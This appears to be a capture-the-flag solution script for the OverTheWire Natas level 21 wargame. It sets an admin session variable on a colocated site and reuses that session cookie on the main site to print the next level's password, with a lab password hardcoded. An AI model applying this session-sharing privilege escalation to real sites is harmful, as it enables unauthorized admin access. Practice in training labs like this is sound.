#!/bin/python
import requests

url = "http://natas21.natas.labs.overthewire.org"
auth = ("natas21", "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56")
url2 = "http://natas21-experimenter.natas.labs.overthewire.org"
auth = ("natas21", "89OWrTkGmiLZLv12JY4tLj2c4FW0xn56")

uri2 = ''.join([url2, '?admin=1', '&debug', '&submit='])

r = requests.post(uri2, auth=auth)

# print(r.text)

cookies = dict(PHPSESSID=r.cookies["PHPSESSID"])
r2 = requests.get(url, auth=auth, cookies=cookies)

# print(r2.text)
for line in r2.text.split("\n"):
    if "Password:" in line:
        print(line.strip())
